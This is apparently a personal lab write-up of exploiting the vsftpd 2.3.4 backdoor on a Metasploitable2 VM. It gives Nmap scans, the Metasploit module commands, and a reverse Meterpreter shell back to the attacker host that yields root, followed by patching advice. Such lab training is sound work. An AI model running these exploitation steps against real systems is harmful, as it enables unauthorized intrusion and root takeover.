# Metasploitable2 — vsftpd 2.3.4 Backdoor RCE

**Target:** 192.168.109.131 (Metasploitable2, isolated lab VM)
**Attacker host:** Kali Linux, 192.168.109.141
**Environment:** Personal, isolated virtual lab — authorized self-practice only

---

## 1. Objective

Identify running services on the target, detect outdated/vulnerable
software versions, and exploit a known vulnerability to demonstrate
remote code execution and privilege escalation to root.

## 2. Scope

- OS and port discovery via Nmap
- Service/version detection via Nmap
- Exploitation of any identified vulnerable service via Metasploit
- Verification of access level obtained (proof of root)

## 3. Tools Used

- Nmap
- Metasploit Framework (msfconsole)
- Netcat

## 4. Methodology

1. **Reconnaissance** — OS and port scan to map the attack surface
2. **Service enumeration** — version scan to identify exploitable software
3. **Exploitation** — match a known CVE/backdoor to a Metasploit module
4. **Post-exploitation** — confirm shell access and privilege level

## 5. Reconnaissance

### Command
```
nmap -O 192.168.109.131
```

### Result (summary)
- Host up, 977 closed TCP ports
- Notable open ports: 21, 22, 23, 25, 53, 80, 111, 139, 445, 512–514,
  1099, 1524, 2049, 2121, 3306, 5432, 5900, 6000, 6667, 8009, 8180
- OS: Linux 2.6.X (Linux 2.6.9 – 2.6.33), general purpose device

### Command
```
nmap -sV 192.168.109.131
```

### Result (key findings)

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | ftp | **vsftpd 2.3.4** |
| 22/tcp | ssh | OpenSSH 4.7p1 Debian 8ubuntu1 |
| 23/tcp | telnet | Linux telnetd |
| 80/tcp | http | Apache httpd 2.2.8 (Ubuntu) DAV/2 |
| 1524/tcp | bindshell | **"Metasploitable root shell"** |
| 3306/tcp | mysql | MySQL 5.0.51a-3ubuntu5 |
| 6667/tcp | irc | UnrealIRCd |

## 6. Observations

- Multiple services running outdated, unlicensed/unpatched versions
- Port 21 (`vsftpd 2.3.4`) is a version with a **publicly known backdoor**
  (CVE-2011-2523)
- Port 1524's banner directly advertises a root-level bindshell —
  strong indicator of a pre-existing compromised state used for
  training purposes

## 7. Risk Review

- Open, unnecessary ports significantly widen the attack surface
- Unpatched FTP service allows unauthenticated remote code execution
- Successful exploitation here would grant an attacker full root
  access to the host

## 8. Exploitation

### Vulnerability
**vsftpd 2.3.4 Backdoor** — CVE-2011-2523. A backdoor was maliciously
inserted into the vsftpd 2.3.4 source archive; sending a specific
string in the FTP username triggers a listener on port 6200 that
provides a root shell.

### Module Used
```
msf > search vsftpd 2.3.4

Matching Modules
================
   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor   2011-07-03        excellent  Yes    VSFTPD v2.3.4 Backdoor Command Execution

msf > use 0
msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.109.131
RHOSTS => 192.168.109.131
msf exploit(unix/ftp/vsftpd_234_backdoor) > run
[-] 192.168.109.131:21 - Msf::OptionValidateError One or more options failed to validate: LHOST.
msf exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 192.168.109.141
LHOST => 192.168.109.141
msf exploit(unix/ftp/vsftpd_234_backdoor) > run
```

**Note:** the initial `run` failed validation because `LHOST` (the
attacker's own listening IP) was not set. Setting `LHOST` to the Kali
VM's IP resolved it.

### Result
```
[*] Started reverse TCP handler on 192.168.109.141:4444
[+] 192.168.109.131:21 - Backdoor has been spawned!
[*] Meterpreter session 1 opened (192.168.109.141:4444 -> 192.168.109.131:44034)
```

## 9. Proof of Access

```
meterpreter > getuid
Server username: root

meterpreter > shell
Process 5355 created.
Channel 1 created.
whoami
root
```

```
meterpreter > sysinfo
Computer     : metasploitable.localdomain
OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
Architecture : i686
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
```

Full root access confirmed via both `getuid` (meterpreter context) and
`whoami` (dropped into a system shell), with `sysinfo` confirming the
underlying OS as Ubuntu 8.04.

## 11. Recommendation

- Immediately remove/replace vsftpd 2.3.4 with a patched version
- Close all unnecessary open ports (telnet, rsh, rlogin, bindshells)
- Update Apache, MySQL, Samba, and other outdated services identified
  in the scan
- Disable or firewall any unused administrative/legacy services
  (rexec, rlogin, NFS if unneeded)
- Conduct regular vulnerability scanning to catch outdated software
  before it becomes exploitable

---

*This assessment was performed entirely within a personal, isolated
lab environment (Metasploitable2 + Kali Linux) for self-training
purposes.*
